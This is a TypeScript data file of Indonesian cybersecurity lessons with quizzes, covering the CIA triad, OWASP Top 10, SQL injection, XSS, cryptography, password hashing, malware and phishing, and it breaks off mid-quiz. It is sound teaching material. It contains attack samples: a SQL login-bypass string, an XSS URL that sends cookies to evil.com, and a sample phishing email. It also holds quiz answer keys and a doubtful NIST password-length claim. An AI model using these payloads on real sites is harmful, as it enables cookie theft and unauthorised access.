import { MaterialData } from "../src/lib/content-types";

export const contentLevels6to8: MaterialData[] = [
  // ==================== LEVEL 6 - CYBERSECURITY (14) ====================
  {
    level: 6,
    order: 1,
    title: "Pengenalan Cybersecurity",
    slug: "pengenalan-cybersecurity",
    description: "Mengenal cybersecurity, mengapa penting, dan peran security professional.",
    icon: "🛡️",
    isProject: false,
    content: `# Pengenalan Cybersecurity

**Cybersecurity** adalah praktik melindungi sistem, jaringan, dan data dari serangan digital yang bertujuan mengakses, mengubah, atau menghancurkan informasi sensitif. Di era digital, keamanan siber menjadi fondasi kepercayaan terhadap layanan online.

## Mengapa Cybersecurity Penting

Setiap organisasi menyimpan data berharga: data pelanggan, keuangan, kekayaan intelektual, hingga rahasia dagang. Satu insiden kebocoran bisa berdampak finansial, reputasi, dan legal. Serangan Ransomware saja pada 2023 merugikan dunia miliaran dolar.

## Tujuan Utama Cybersecurity

1. **Mencegah** akses tidak sah ke sistem.
2. **Mendeteksi** insiden sedini mungkin.
3. **Menanggapi** insiden dengan prosedur terstruktur.
4. **Memulihkan** layanan dan data pasca-insiden.

## Peran Security Professional

\`\`\`text
- Security Analyst    : monitoring harian & analisis log
- Penetration Tester  : menyerang sistem secara legal untuk menemukan celah
- Security Engineer   : membangun & mengkonfigurasi defense
- Incident Responder  : menangani saat serangan terjadi
- Forensic Analyst    : investigasi pasca-insiden
- SOC Engineer        : mengoperasikan Security Operations Center
\`\`\`

## Quick Security Audit

\`\`\`bash
# Cek port terbuka di host
sudo netstat -tulpn | grep LISTEN

# Cek update keamanan yang tertunda (Debian/Ubuntu)
sudo apt list --upgradable 2>/dev/null | grep -i secur

# Cek user dengan privilege sudo
getent group sudo
\`\`\`

> Cybersecurity bukan produk, melainkan proses berkelanjutan. Pertahanan terbaik adalah kombinasi teknologi, prosedur, dan kesadaran manusia.`,
    quiz: [
      {
        question: "Apa tujuan utama cybersecurity?",
        options: ["Mempercepat koneksi internet", "Melindungi sistem, jaringan, dan data", "Menjual perangkat lunak", "Mengganti hardware lama"],
        answer: 1,
        explanation: "Cybersecurity melindungi sistem, jaringan, dan data dari serangan digital."
      },
      {
        question: "Peran yang menyerang sistem secara legal untuk menemukan celah?",
        options: ["SOC Engineer", "Penetration Tester", "Forensic Analyst", "Network Admin"],
        answer: 1,
        explanation: "Penetration Tester melakukan simulasi serangan dengan izin untuk menemukan kerentanan."
      },
      {
        question: "Perintah untuk melihat port yang sedang mendengarkan?",
        options: ["sudo netstat -tulpn | grep LISTEN", "ping localhost", "curl -I https://site", "ssh user@host"],
        answer: 0,
        explanation: "netstat -tulpn menampilkan port TCP/UDP yang sedang dalam status LISTEN."
      }
    ]
  },
  {
    level: 6,
    order: 2,
    title: "CIA Triad & Prinsip Keamanan",
    slug: "cia-triad-prinsip-keamanan",
    description: "Confidentiality, Integrity, Availability - tiga pilar keamanan informasi.",
    icon: "🎯",
    isProject: false,
    content: `# CIA Triad & Prinsip Keamanan

**CIA Triad** adalah model panduan keamanan informasi yang terdiri dari tiga pilar: Confidentiality, Integrity, dan Availability. Ketiganya menjadi tolok ukur untuk merancang dan mengevaluasi sistem yang aman.

## Confidentiality (Kerahasiaan)

Memastikan informasi hanya diakses oleh pihak yang berwenang. Contoh: enkripsi data, kontrol akses berbasis peran (RBAC), dan autentikasi multi-faktor.

\`\`\`bash
# Set permission file agar hanya owner yang bisa baca
chmod 600 ~/.ssh/id_rsa
ls -l ~/.ssh/id_rsa
# -rw------- 1 user user 0 Jan 1 00:00 /home/user/.ssh/id_rsa
\`\`\`

## Integrity (Integritas)

Menjamin data tidak diubah tanpa otorisasi. Hash dan checksum digunakan untuk mendeteksi perubahan.

\`\`\`bash
# Generate hash SHA-256 untuk verifikasi file
sha256sum important.zip > important.zip.sha256
sha256sum -c important.zip.sha256
# important.zip: OK
\`\`\`

## Availability (Ketersediaan)

Memastikan sistem dan data tersedia saat dibutuhkan. Dilakukan melalui backup, redundansi, dan mitigasi DDoS.

\`\`\`text
Strategi Availability:
- Backup rutin (3-2-1 rule: 3 copy, 2 media, 1 offsite)
- Load balancer & failover
- CDN untuk distribusi beban
- Rate limiting untuk mencegah abuse
\`\`\`

## Prinsip Pendukung

- **Authentication** — bukti identitas (siapa Anda).
- **Authorization** — hak akses (apa yang boleh Anda lakukan).
- **Non-repudiation** — tidak bisa menyangkal tindakan (digital signature).
- **Accountability** — setiap tindakan dapat ditelusuri (audit log).

> CIA Triad adalah fondasi. Saat merancang fitur baru, tanyakan: apakah menambah atau justru mengurangi salah satu dari C, I, atau A?`,
    quiz: [
      {
        question: "Apa kepanjangan CIA dalam CIA Triad?",
        options: ["Central Intelligence Agency", "Confidentiality, Integrity, Availability", "Crypto, Internet, Access", "Control, Identity, Audit"],
        answer: 1,
        explanation: "CIA Triad = Confidentiality, Integrity, dan Availability, tiga pilar keamanan informasi."
      },
      {
        question: "Teknik yang menjaga Integrity data?",
        options: ["Backup harian", "Hash & checksum", "Load balancer", "Rate limiting"],
        answer: 1,
        explanation: "Hash dan checksum mendeteksi perubahan data sehingga menjaga integritas."
      },
      {
        question: "Strategi backup 3-2-1 berkaitan dengan pilar?",
        options: ["Confidentiality", "Integrity", "Availability", "Authentication"],
        answer: 2,
        explanation: "Backup rutin menjaga Availability agar data dapat dipulihkan saat dibutuhkan."
      }
    ]
  },
  {
    level: 6,
    order: 3,
    title: "Jenis Ancaman Cyber",
    slug: "jenis-ancaman-cyber",
    description: "Malware, phishing, DDoS, MITM, dan jenis serangan cyber lainnya.",
    icon: "⚠️",
    isProject: false,
    content: `# Jenis Ancaman Cyber

Ancaman cyber hadir dalam beragam bentuk, dari yang teknis hingga yang memanfaatkan faktor manusia. Memahami jenis ancaman adalah langkah pertama dalam membangun pertahanan efektif.

## Klasifikasi Ancaman

\`\`\`text
1. Malware          : virus, worm, trojan, ransomware, spyware
2. Phishing/Social  : manipulasi psikologis untuk dapatkan info
3. Network Attack   : DDoS, MITM, packet sniffing
4. Web Attack       : SQLi, XSS, CSRF
5. Physical Attack  : akses fisik ke perangkat
6. Insider Threat   : ancaman dari dalam organisasi
\`\`\`

## Man-in-the-Middle (MITM)

Penyerang menyisip di antara dua pihak yang berkomunikasi untuk menyadap atau mengubah data. Pencegahan utama adalah enkripsi end-to-end dan sertifikat TLS yang valid.

\`\`\`bash
# Cek sertifikat TLS sebuah situs
echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null \\
  | openssl x509 -noout -subject -issuer -dates
\`\`\`

## Distributed Denial of Service (DDoS)

Penyerang membanjiri target dengan lalu lintas dari ribulan mesin (botnet) hingga server kehabisan resource. Mitigasi: rate limiting, WAF, CDN dengan absorpsi serangan.

\`\`\`bash
# Monitor koneksi aktif per IP (mendeteksi pola DDoS)
sudo netstat -anp | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 \\
  | sort | uniq -c | sort -nr | head -20
\`\`\`

## Zero-Day vs Known Threat

- **Known threat** — kerentanan sudah diketahui, patch tersedia. Cukup update rutin.
- **Zero-day** — kerentanan belum diketahui vendor, belum ada patch. Butuh pertahanan berlapis (defense in depth).

> Tidak ada sistem 100% aman. Strategi terbaik adalah **defense in depth**: gabungan firewall, EDR, patching, dan training manusia.`,
    quiz: [
      {
        question: "Apa itu serangan MITM?",
        options: ["Banjir lalu lintas ke server", "Penyerang menyisip di antara komunikasi", "Virus yang menyebar otomatis", "Email palsu menipu user"],
        answer: 1,
        explanation: "Man-in-the-Middle menyadap atau mengubah komunikasi dengan menyisip di antara dua pihak."
      },
      {
        question: "Pencegahan utama serangan MITM?",
        options: ["Matikan firewall", "Enkripsi TLS end-to-end", "Update kernel", "Backup data"],
        answer: 1,
        explanation: "TLS enkripsi mencegah penyadap membaca atau mengubah data yang ditransmisikan."
      },
      {
        question: "Apa yang dimaksud zero-day vulnerability?",
        options: ["Bug yang sudah di-patch", "Kerentanan belum diketahui vendor", "Serangan DDoS", "Serangan fisik"],
        answer: 1,
        explanation: "Zero-day adalah kerentanan yang belum diketahui vendor sehingga belum ada patch resmi."
      }
    ]
  },
  {
    level: 6,
    order: 4,
    title: "Etika & Legalitas Hacker",
    slug: "etika-legalitas-hacker",
    description: "Etika hacker, UU ITE, dan legalitas penetration testing di Indonesia.",
    icon: "⚖️",
    isProject: false,
    content: `# Etika & Legalitas Hacker

Dunia keamanan siber memiliki garis tipis antara riset yang bermanfaat dan tindakan kriminal. Memahami etika dan kerangka hukum sangat penting agar keterampilan hacking digunakan secara legal dan etis.

## Klasifikasi Hacker

\`\`\`text
- White Hat  : ethical hacker, bekerja dengan izin, membantu organisasi
- Black Hat  : penyerang jahat, melanggar hukun untuk keuntungan
- Gray Hat   : menembus sistem tanpa izin tapi tidak untuk merusak
- Blue Hat   : eksternal yang diundang untuk pentest (Microsoft Blue Hat)
- Red Hat    : pengejar black hat (agresif, fokus takedown)
\`\`\`

## UU ITE Indonesia

Undang-Undang No. 11/2008 (sebagai diubah UU 19/2016) tentang Informasi dan Transaksi Elektronik mengatur berbagai tindakan ilegal di dunia maya:

\`\`\`text
Pasal 27: konten ilegal (sara, pencemaran nama baik, ancaman kekerasan)
Pasal 30: akses ilegal & intercept (hacking tanpa izin)
Pasal 33: virus/malware yang menimbulkan kerugian
Pasal 35: manipulasi informasi elektronik
Sanksi: denda ratusan juta hingga penjara belasan tahun
\`\`\`

## Syarat Legal Pentest

Sebelum melakukan penetration testing, pastikan hal berikut:

\`\`\`bash
# Contoh scope tertulis yang HARUS ada sebelum pentest
cat scope-of-work.txt
\`\`\`

\`\`\`text
- Surat izin tertulis dari pemilik aset
- Scope jelas: IP/URL/domain yang boleh diuji
- Out-of-scope: sistem yang tidak boleh disentuh
- Aturan: no data exfiltration, no DoS
- Window waktu pengujian
- Kontak darurat saat terjadi insiden
- Rules of engagement (RoE) ditandatangani
\`\`\`

## Etika Hacker

1. **Izin** — selalu dapatkan izin tertulis sebelum menguji.
2. **Dampak minimal** — hindari merusak atau menghentikan layanan.
3. **Konfidensialitas** — laporan kerentanan hanya untuk klien.
4. **Tanggung jawab** — bantu memperbaiki, bukan hanya mengeksploitasi.

> Tanpa izin tertulis, niat baik pun bisa berujung di penjara. **Written authorization is everything.**`,
    quiz: [
      {
        question: "Hacker yang bekerja secara legal dengan izin disebut?",
        options: ["Black Hat", "White Hat", "Script Kiddie", "Carder"],
        answer: 1,
        explanation: "White Hat hacker bekerja dengan izin dan membantu organisasi mengamankan sistem."
      },
      {
        question: "Dasar hukum transaksi elektronik di Indonesia?",
        options: ["UU ITE", "UU PDP", "KUHP", "UU Hak Cipta"],
        answer: 0,
        explanation: "UU ITE (No. 11/2008 jo. No. 19/2016) mengatur tindakan ilegal di dunia maya."
      },
      {
        question: "Syarat mutlak sebelum melakukan pentest?",
        options: ["Alat canggih", "Izin tertulis dari pemilik aset", "Anonimitas", "Bekerja malam hari"],
        answer: 1,
        explanation: "Izin tertulis (scope of work & rules of engagement) adalah fondasi legalitas pentest."
      }
    ]
  },
  {
    level: 6,
    order: 5,
    title: "OWASP Top 10",
    slug: "owasp-top-10",
    description: "10 kerentanan web paling kritis menurut OWASP.",
    icon: "📋",
    isProject: false,
    content: `# OWASP Top 10

**OWASP Top 10** adalah daftar standar 10 risiko keamanan aplikasi web paling kritis, dirilis oleh Open Web Application Security Project. Versi terbaru (2021) menjadi referensi global untuk audit keamanan aplikasi.

## OWASP Top 10 (2021)

\`\`\`text
A01: Broken Access Control
A02: Cryptographic Failures
A03: Injection (SQLi, NoSQLi, Command)
A04: Insecure Design
A05: Security Misconfiguration
A06: Vulnerable & Outdated Components
A07: Identification & Authentication Failures
A08: Software & Data Integrity Failures
A09: Security Logging & Monitoring Failures
A10: Server-Side Request Forgery (SSRF)
\`\`\`

## Identifikasi Cepat

\`\`\`bash
# Cek header keamanan HTTP
curl -sI https://example.com | grep -iE "strict|x-frame|x-content|content-security"

# Scan dengan OWASP ZAP CLI
zap-cli quick-scan https://example.com
zap-cli active-scan https://example.com
\`\`\`

## Mitigasi Per Kategori

\`\`\`text
A01 Access Control : enforce authorization di server, default deny
A02 Crypto         : TLS 1.3, jangan simpan secret di kode, hash password
A03 Injection      : prepared statements, input validation, ORM
A04 Insecure Design: threat modeling sejak fase desain
A05 Misconfig      : hapus default credential, disable debug, hardening
A06 Components     : dependency scanning (npm audit, Snyk, Dependabot)
A07 AuthN          : MFA, bcrypt/argon2, lockout policy
A08 Integrity      : signature verification, CI/CD pipeline secure
A09 Logging        : log event penting, SIEM, alerting
A10 SSRF           : whitelist outbound URL, isolasi network
\`\`\`

> OWASP Top 10 bukan checklist tertutup. Gunakan sebagai minimum baseline — keamanan sejati butuh pendekatan defense in depth yang menyeluruh.`,
    quiz: [
      {
        question: "Posisi #1 OWASP Top 10 versi 2021?",
        options: ["Injection", "Broken Access Control", "XSS", "SSRF"],
        answer: 1,
        explanation: "Broken Access Control menempati posisi pertama di OWASP Top 10 2021."
      },
      {
        question: "Tool OWASP untuk scan aplikasi web?",
        options: ["Nmap", "OWASP ZAP", "Metasploit", "Burp Suite Pro"],
        answer: 1,
        explanation: "OWASP ZAP (Zed Attack Proxy) adalah scanner web open-source dari OWASP."
      },
      {
        question: "Cara mencegah kerentanan Injection?",
        options: ["String concatenation", "Prepared statements & ORM", "Mematikan database", "Menyembunyikan URL"],
        answer: 1,
        explanation: "Prepared statements dan ORM memisahkan kode dari data, mencegah injection."
      }
    ]
  },
  {
    level: 6,
    order: 6,
    title: "SQL Injection",
    slug: "sql-injection",
    description: "Serangan menyisipkan SQL berbahaya dan cara pencegahannya.",
    icon: "💉",
    isProject: false,
    content: `# SQL Injection

**SQL Injection (SQLi)** adalah serangan menyisipkan kode SQL berbahaya melalui input untuk memanipulasi database. Konsekuensinya bisa berupa bypass login, pencurian data, hingga penghapusan tabel.

## Cara Kerja

\`\`\`sql
-- Query rentan (string concatenation)
SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'
\`\`\`

Penyerang memasukkan \`' OR '1'='1\` sebagai password. Query menjadi:

\`\`\`sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
\`\`\`

Kondisi \`'1'='1'\` selalu true, sehingga login berhasil tanpa password.

## Jenis SQL Injection

\`\`\`text
1. In-band UNION    : hasil digabung dengan UNION SELECT
2. Boolean-based blind : tebak data dari true/false response
3. Time-based blind : tebak dari delay (SLEEP/BENCHMARK)
4. Error-based      : ekstrak info dari pesan error DB
5. Second-order     : payload disimpan, dieksekusi nanti
\`\`\`

## Pencegahan: Prepared Statements

\`\`\`python
# Python dengan parameterized query (AMAN)
import psycopg2

conn = psycopg2.connect("dbname=app user=app")
cur = conn.cursor()
cur.execute(
    "SELECT id, name FROM users WHERE username = %s AND password = %s",
    (username, password)
)
user = cur.fetchone()
\`\`\`

Driver akan otomatis escape input sehingga tidak bisa merusak struktur query.

## Pencegahan Tambahan

\`\`\`text
- Gunakan ORM (Prisma, SQLAlchemy, Eloquent)
- Apply principle of least privilege ke user DB
- Disable pesan error verbose di production
- Validasi input (allowlist, bukan blocklist)
- Aktifkan WAF dengan rule SQLi
- Lakukan static analysis (Semgrep, CodeQL)
\`\`\`

> Prepared statements bukan opsional — ini standar wajib untuk semua query yang menerima input user.`,
    quiz: [
      {
        question: "Apa itu SQL Injection?",
        options: ["Backup otomatis database", "Menyisipkan SQL berbahaya via input", "Optimasi query", "Enkripsi tabel"],
        answer: 1,
        explanation: "SQL Injection menyisipkan kode SQL berbahaya melalui input untuk memanipulasi database."
      },
      {
        question: "Cara paling efektif mencegah SQLi?",
        options: ["String concatenation", "Prepared statements", "Mematikan database", "Menyembunyikan form"],
        answer: 1,
        explanation: "Prepared statements memisahkan kode SQL dari data input sehingga tidak bisa di-inject."
      },
      {
        question: "Input yang sering dipakai untuk bypass login?",
        options: ["admin/admin", "' OR '1'='1", "DROP TABLE", "SELECT *"],
        answer: 1,
        explanation: "' OR '1'='1 membuat kondisi WHERE selalu true sehingga login berhasil."
      }
    ]
  },
  {
    level: 6,
    order: 7,
    title: "Cross-Site Scripting XSS",
    slug: "xss-cross-site-scripting",
    description: "XSS: stored, reflected, DOM-based, dan pencegahannya.",
    icon: "🎭",
    isProject: false,
    content: `# Cross-Site Scripting (XSS)

**XSS** adalah serangan menyisipkan script berbahaya ke halaman web yang dilihat user lain. Browser korban mengeksekusi script karena menganggapnya berasal dari situs tepercaya.

## Tiga Jenis XSS

\`\`\`text
1. Stored XSS    : payload disimpan di DB, eksekusi saat user lain load page
2. Reflected XSS : payload dari URL/query, dipantulkan oleh server
3. DOM-based XSS : payload diproses di client via JavaScript (tanpa server)
\`\`\`

## Contoh Reflected XSS

URL berbahaya: \`https://site.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>\`

Jika server memantulkan \`q\` tanpa escape, cookie korban dikirim ke domain penyerang.

## Pencegahan: Output Encoding

\`\`\`python
# Python: escape output sebelum render HTML
import html

user_input = '<script>alert("xss")</script>'
safe_output = html.escape(user_input)
print(safe_output)
# &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
\`\`\`

## Content Security Policy (CSP)

Header CSP membatasi sumber script yang boleh dieksekusi browser:

\`\`\`nginx
# Nginx: kirim header CSP
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline';" always;
\`\`\`

## Pencegahan Lengkap

\`\`\`text
- Output encoding sesuai konteks (HTML, attribute, JS, URL)
- Gunakan template engine yang auto-escape (React, Django, Twig)
- HttpOnly cookies agar tidak bisa dibaca JavaScript
- Implementasi CSP yang ketat
- Validasi input di server (allowlist)
- Hindari inline event handler (onclick, onload)
- Sediakan API JSON terpisah, render di client
\`\`\`

> XSS tidak hanya mencuri cookie — attacker bisa melakukan apa pun yang dilakukan korban di situs tersebut. Encode, encode, encode!`,
    quiz: [
      {
        question: "Jenis XSS yang payload-nya disimpan di database?",
        options: ["Reflected XSS", "Stored XSS", "DOM-based XSS", "Mutation XSS"],
        answer: 1,
        explanation: "Stored XSS menyimpan payload di DB dan menjangkau semua user yang melihat halaman tersebut."
      },
      {
        question: "Header HTTP untuk mitigasi XSS?",
        options: ["X-Powered-By", "Content-Security-Policy", "Server", "Etag"],
        answer: 1,
        explanation: "Content-Security-Policy membatasi sumber script yang boleh dieksekusi browser."
      },
      {
        question: "Cara mencegah XSS saat menampilkan input user?",
        options: ["Output encoding", "Mematikan JavaScript", "Menyembunyikan form", "CSS minify"],
        answer: 0,
        explanation: "Output encoding mengubah karakter berbahaya (<, >, &) menjadi entity aman."
      }
    ]
  },
  {
    level: 6,
    order: 8,
    title: "Kriptografi Dasar",
    slug: "kriptografi-dasar",
    description: "Symmetric/asymmetric encryption, hash, dan digital signature.",
    icon: "🔐",
    isProject: false,
    content: `# Kriptografi Dasar

**Kriptografi** adalah ilmu mengamankan informasi melalui transformasi data menjadi bentuk yang tidak bisa dibaca tanpa kunci. Kriptografi modern adalah fondasi TLS, VPN, blockchain, dan aplikasi perbankan.

## Jenis Enkripsi

\`\`\`text
Symmetric (satu kunci)        : AES, ChaCha20, DES (deprecated)
Asymmetric (sepasang kunci)   : RSA, ECC, Ed25519
Hash (one-way)                : SHA-256, SHA-3, BLAKE2
Key Exchange                  : Diffie-Hellman, ECDH
\`\`\`

## Symmetric vs Asymmetric

- **Symmetric**: cepat, satu kunci untuk encrypt & decrypt. Cocok untuk data besar.
- **Asymmetric**: public key encrypt, private key decrypt. Cocok untuk key exchange & signature.

\`\`\`bash
# Encrypt file dengan AES-256 (symmetric)
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.txt.enc
openssl enc -aes-256-cbc -d -in secret.txt.enc -out secret.txt

# Generate pasangan kunci RSA 4096 (asymmetric)
openssl genrsa -out private.pem 4096
openssl rsa -in private.pem -pubout -out public.pem
\`\`\`

## Hash Function

Hash mengubah input menjadi digest fixed-length yang unik. Tidak bisa di-reverse.

\`\`\`bash
# Hash file dengan SHA-256
echo -n "password" | sha256sum
# 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8  -
\`\`\`

## Digital Signature

Tanda tangan digital membuktikan bahwa pesan berasal dari pengirim tertentu dan tidak diubah:

\`\`\`bash
# Tanda tangani file dengan private key
openssl dgst -sha256 -sign private.pem -out doc.sig doc.txt

# Verifikasi dengan public key
openssl dgst -sha256 -verify public.pem -signature doc.sig doc.txt
# Verified OK
\`\`\`

> Aturan emas: **jangan pernah roll-your-own crypto**. Gunakan library yang sudah diaudit seperti OpenSSL, libsodium, atau Tink.`,
    quiz: [
      {
        question: "Algoritma enkripsi simetris?",
        options: ["RSA", "AES", "ECC", "Ed25519"],
        answer: 1,
        explanation: "AES adalah algoritma enkripsi simetris dengan satu kunci untuk encrypt dan decrypt."
      },
      {
        question: "Fungsi hash yang benar?",
        options: ["Bisa di-reverse", "Output panjang variabel", "One-way function", "Membutuhkan kunci"],
        answer: 2,
        explanation: "Hash adalah one-way function: dari digest tidak bisa dikembalikan ke input asli."
      },
      {
        question: "Tujuan digital signature?",
        options: ["Enkripsi pesan", "Membuktikan identitas & integritas", "Kompresi data", "Backup otomatis"],
        answer: 1,
        explanation: "Digital signature membuktikan pengirim (autentikasi) dan bahwa data tidak diubah (integritas)."
      }
    ]
  },
  {
    level: 6,
    order: 9,
    title: "Password Security & Hashing",
    slug: "password-security-hashing",
    description: "Hash password dengan bcrypt/argon2, salt, dan password policy.",
    icon: "👁️",
    isProject: false,
    content: `# Password Security & Hashing

Password tidak boleh disimpan dalam plaintext. Hashing password dengan algoritma yang tepat adalah lapis pertama pertahanan saat database bocor.

## Mengapa Hash, Bukan Encrypt?

- **Encrypt** reversible — bisa didekripsi dengan kunci. Berbahaya jika kunci bocor.
- **Hash** one-way — tidak bisa di-reverse. Inilah yang dipakai untuk password.

\`\`\`text
Algoritma yang direkomendasikan:
- Argon2id (pemenang Password Hashing Competition 2015)
- bcrypt (battle-tested, widely supported)
- scrypt (memory-hard)
- PBKDF2 (jika tidak ada opsi lain)

DILARANG: MD5, SHA1, SHA256 plain (terlalu cepat untuk brute force)
\`\`\`

## Salt: Mencegah Rainbow Table

**Salt** adalah random string yang ditambahkan ke password sebelum hash, membuat dua user dengan password sama memiliki hash berbeda.

\`\`\`python
# Python: hashing dengan bcrypt
import bcrypt

password = b"k4t4s4ndr4Am4n"

# Generate salt + hash sekaligus
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))
print(hashed)
# b'$2b$12$N9qo8uLOickgx2ZMRZoMy...'

# Verifikasi password
if bcrypt.checkpw(b"k4t4s4ndr4Am4n", hashed):
    print("Password benar")
else:
    print("Password salah")
\`\`\`

## Argon2id (Rekomendasi Modern)

\`\`\`python
# Python: Argon2id dengan argon2-cffi
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # iterasi
    memory_cost=65536,  # 64 MB
    parallelism=4,      # thread
)
hash_str = ph.hash("k4t4s4ndr4Am4n")
ph.verify(hash_str, "k4t4s4ndr4Am4n")  # True
\`\`\`

## Password Policy Modern

\`\`\`text
- Minimal 12 karakter (NIST 800-63B)
- Tidak wajib karakter khusus (bikin user pakai pola mudah ditebak)
- Cek terhadap database password bocor (HaveIBeenPwned API)
- Rate limit login (lockout setelah 5 gagal)
- Wajibkan MFA untuk akun sensitif
- Blacklist password umum (password, 123456, qwerty)
\`\`\`

> Password hashing yang lambat (bcrypt rounds=12, Argon2id) adalah feature, bukan bug — membuat brute force tidak ekonomis.`,
    quiz: [
      {
        question: "Algoritma yang TIDAK boleh untuk password?",
        options: ["Argon2id", "bcrypt", "MD5 plain", "scrypt"],
        answer: 2,
        explanation: "MD5 plain terlalu cepat sehingga rentan brute force. Gunakan bcrypt/argon2."
      },
      {
        question: "Apa fungsi salt dalam password hashing?",
        options: ["Mempercepat hash", "Mencegah rainbow table", "Mengenkripsi password", "Memvalidasi user"],
        answer: 1,
        explanation: "Salt membuat dua password identik memiliki hash berbeda, mencegah rainbow table attack."
      },
      {
        question: "Rekomendasi panjang password minimal (NIST)?",
        options: ["6 karakter", "8 karakter", "12 karakter", "20 karakter"],
        answer: 2,
        explanation: "NIST 800-63B merekomendasikan minimal 12 karakter untuk password yang kuat."
      }
    ]
  },
  {
    level: 6,
    order: 10,
    title: "Malware & Virus",
    slug: "malware-virus",
    description: "Virus, worm, trojan, ransomware, dan cara kerja malware.",
    icon: "🦠",
    isProject: false,
    content: `# Malware & Virus

**Malware** (malicious software) adalah program yang dirancang untuk merusak, mencuri data, atau mengendalikan sistem tanpa izin. Memahami jenis dan cara kerjanya penting untuk pertahanan.

## Klasifikasi Malware

\`\`\`text
Virus      : menempel di file lain, butuh host untuk menyebar
Worm       : mandiri, menyebar via jaringan tanpa interaksi user
Trojan     : menyamar sebagai aplikasi sah, membuka backdoor
Ransomware : mengenkripsi file, minta tebusan
Spyware    : memata-matai aktivitas user
Rootkit    : menyembunyikan diri di kernel/system
Adware     : spam iklan, kadang dilengkapi tracking
Botnet     : jaringan zombie untuk DDoS/spam
\`\`\`

## Cara Penyebaran

\`\`\`text
- Email attachment (phishing)
- Download software crack/keygen
- USB/external drive autorun
- Exploit kit di website (drive-by download)
- Software supply chain attack
- Macro Office yang malicious
\`\`\`

## Indikasi Sistem Terinfeksi

\`\`\`bash
# Linux: cek proses mencurigakan
ps auxf | grep -vE "grep|systemd" | awk '$3 > 50 {print}'

# Cek koneksi outbound yang tidak biasa
sudo ss -tunap | grep ESTABLISHED

# Cek cron job persistence
sudo crontab -l; ls -la /etc/cron.d/
\`\`\`

## Pertahanan Anti-Malware

\`\`\`text
1. Install EDR/Antivirus (Defender, ClamAV, CrowdStrike)
2. Update OS & software secara rutin (patch management)
3. Application whitelisting (hanya app approved yang jalan)
4. Disable macro Office by default
5. Network segmentation untuk membatasi lateral movement
6. Backup 3-2-1 untuk recovery ransomware
7. Email filtering & sandboxing attachment
8. Disable autorun USB
9. Least privilege: user biasa, bukan admin untuk sehari-hari
\`\`\`

> Ransomware bukan masalah teknis — ini masalah bisnis. **Backup offline yang teruji** adalah satu-satunya pertahanan yang pasti.`,
    quiz: [
      {
        question: "Malware yang mengenkripsi file dan minta tebusan?",
        options: ["Trojan", "Ransomware", "Spyware", "Adware"],
        answer: 1,
        explanation: "Ransomware mengenkripsi data korban dan meminta tebusan untuk kunci dekripsi."
      },
      {
        question: "Perbedaan utama worm dengan virus?",
        options: ["Worm butuh host", "Worm menyebar mandiri via jaringan", "Virus lebih berbahaya", "Worm hanya di Linux"],
        answer: 1,
        explanation: "Worm menyebar mandiri lewat jaringan tanpa interaksi user, sedangkan virus butuh host file."
      },
      {
        question: "Pertahanan paling efektif terhadap ransomware?",
        options: ["Antivirus saja", "Backup offline teruji", "Mematikan internet", "Update sekali setahun"],
        answer: 1,
        explanation: "Backup 3-2-1 yang offline dan teruji restore memungkinkan recovery tanpa bayar tebusan."
      }
    ]
  },
  {
    level: 6,
    order: 11,
    title: "Social Engineering",
    slug: "social-engineering",
    description: "Phishing, pretexting, baiting - manipulasi psikologis penyerang.",
    icon: "🎣",
    isProject: false,
    content: `# Social Engineering

**Social engineering** adalah serangan yang memanipulasi faktor manusia — bukan teknis — untuk mendapatkan akses atau informasi. Karena manusia adalah "firewall paling lemah", serangan ini sangat efektif.

## Teknik Umum

\`\`\`text
Phishing    : email/SMS palsu menyamar sebagai entitas tepercaya
Spear Phishing : phishing tertarget, profile korban spesifik
Whaling     : phishing targeting eksekutif senior
Vishing     : phishing via voice call (telepon)
Smishing    : phishing via SMS/WhatsApp
Pretexting  : skenario fiktif untuk dapatkan info (survey, IT support)
Baiting     : umpan fisik (USB di parking lot)
Tailgating  : ikut masuk fisik ke gedung tanpa badge
Quid Pro Quo: tukaran jasa (free IT support untuk credential)
\`\`\`

## Contoh Email Phishing

\`\`\`text
From: "IT Support Bank ABC" <support@bank-abc-secure.com>
Subject: VERIFIKASI SEGERA - Akun akan diblokir!

Pelanggan Yth,
Kami mendeteksi aktivitas mencurigakan pada akun Anda.
Login dalam 24 jam atau akun akan diblokir permanen:
https://bank-abc-secure.com/verify

Hormat kami,
Tim Keamanan Bank ABC
\`\`\`

Tanda bahaya: domain mencurigakan, urgency berlebihan, link tidak cocok dengan brand.

## Analisis Header Email

\`\`\`bash
# Cek SPF/DKIM/DMARC di header email
# Simpan email sebagai .eml lalu:
grep -iE "Received:|From:|Reply-To:|Return-Path:|SPF|DKIM|DMARC" email.eml

# WHOIS domain pengirim
whois bank-abc-secure.com | grep -iE "registrant|creation|registrar"
\`\`\`

## Pertahanan: People + Process + Tech

\`\`\`text
People  : training rutin, phishing simulation, security awareness
Process : verifikasi via channel lain (call back ke nomor resmi)
Tech    : email filtering (SPF/DKIM/DMARC), MFA, anti-phishing gateway
Policy  : tidak pernah minta password via email/SMS
\`\`\`

## Red Flag Phishing

\`\`\`text
- Urgency/ancaman ("akun diblokir 24 jam")
- Permintaan info sensitif via email
- Domain mirip tapi tidak persis (amaz0n.com, paypa1.com)
- Tautan hover tidak cocok dengan teks
- Lampiran tak diharapkan (.zip, .exe, .docm)
- Bahasa formal berlebihan atau justru error
- Pengirim display name ≠ alamat email sebenarnya
\`\`\`

> 90%+ insiden keamanan dimulai dengan phishing. Investasi terbaik adalah **training awareness berkelanjutan**, bukan sekali setahun.`,
    quiz: [
      {
        question: "Phishing yang menargetkan eksekutif senior disebut?",
        options: ["Vishing", "Whaling", "Smishing", "Baiting"],
        answer: 1,
        explanation: "Whaling adalah phishing tertarget terhadap high-profile target seperti CEO/CFO."
      },
      {
        question: "Teknik social engineering dengan USB di parkiran?",
        options: ["Phishing", "Pretexting", "Baiting", "Tailgating"],
        answer: 2,
        explanation: "Baiting menggunakan umpan fisik (USB, CD) yang menggoda korban mencolokkannya."
